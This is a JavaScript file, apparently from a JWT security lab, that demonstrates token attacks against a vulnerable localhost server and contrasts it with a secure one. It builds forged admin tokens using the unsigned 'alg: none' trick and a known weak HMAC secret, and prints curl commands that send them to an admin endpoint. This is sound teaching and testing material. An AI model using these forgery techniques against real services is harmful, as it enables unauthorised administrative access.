// attack-demos.js - JWT Attack Demonstrations
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

console.log('🔓 JWT Attack Demonstrations\n');

// Attack 1: Algorithm None Attack
console.log('=== Attack 1: Algorithm None Attack ===');
console.log('This attack exploits servers that accept {"alg":"none"} tokens\n');

// Create a token with alg: none (no signature)
const noneHeader = Buffer.from(JSON.stringify({alg: 'none', typ: 'JWT'})).toString('base64url');
const nonePayload = Buffer.from(JSON.stringify({
  sub: 'admin',
  role: 'admin',
  iat: Math.floor(Date.now() / 1000),
  exp: Math.floor(Date.now() / 1000) + 3600
})).toString('base64url');

const noneToken = `${noneHeader}.${nonePayload}.`; // Empty signature
console.log('Forged token (alg: none):');
console.log(noneToken);
console.log('\nThis token should work on the vulnerable server (port 1234)');
console.log('But should be rejected by the secure server (port 1235)\n');

// Attack 2: Weak Secret Token Forgery
console.log('=== Attack 2: Weak Secret Token Forgery ===');
console.log('This attack uses the known weak secret to forge tokens\n');

const weakSecret = 'weak-secret-lab-only';
const forgedToken = jwt.sign({
  sub: 'admin',
  role: 'admin',
  iat: Math.floor(Date.now() / 1000),
  exp: Math.floor(Date.now() / 1000) + (7 * 24 * 60 * 60) // 7 days
}, weakSecret, { algorithm: 'HS256' });

console.log('Forged token (weak secret):');
console.log(forgedToken);
console.log('\nThis token should work on the vulnerable server (port 1234)');
console.log('But should be rejected by the secure server (port 1235)\n');

// Attack 3: Token Analysis
console.log('=== Attack 3: Token Analysis ===');
console.log('Decode tokens to see their contents:\n');

// Decode the forged token
const decoded = jwt.decode(forgedToken, { complete: true });
console.log('Decoded forged token:');
console.log(JSON.stringify(decoded, null, 2));
console.log('\nNotice: No iss (issuer) or aud (audience) claims');
console.log('This makes the token vulnerable to cross-service attacks\n');

// Generate secure token for comparison
console.log('=== Secure Token Example ===');
const secureSecret = crypto.randomBytes(64).toString('hex');
const secureToken = jwt.sign({
  sub: 'admin',
  role: 'admin',
  iss: 'jwt-lab-secure',
  aud: 'jwt-lab-client',
  iat: Math.floor(Date.now() / 1000),
  exp: Math.floor(Date.now() / 1000) + 900 // 15 minutes
}, secureSecret, { 
  algorithm: 'HS256'
});

console.log('Secure token (with proper claims):');
console.log(secureToken);
console.log('\nDecoded secure token:');
const secureDecoded = jwt.decode(secureToken, { complete: true });
console.log(JSON.stringify(secureDecoded, null, 2));

console.log('\n=== Testing Instructions ===');
console.log('1. Start both servers:');
console.log('   npm run start-vuln    # Port 1234');
console.log('   npm run start-secure  # Port 1235');
console.log('\n2. Test attacks using curl or Postman:');
console.log('   # Algorithm none attack');
console.log(`   curl http://localhost:1234/admin -H "Authorization: Bearer ${noneToken}"`);
console.log('\n   # Weak secret attack');
console.log(`   curl http://localhost:1234/admin -H "Authorization: Bearer ${forgedToken}"`);
console.log('\n3. Verify attacks fail on secure server:');
console.log(`   curl http://localhost:1235/admin -H "Authorization: Bearer ${noneToken}"`);
console.log(`   curl http://localhost:1235/admin -H "Authorization: Bearer ${forgedToken}"`);
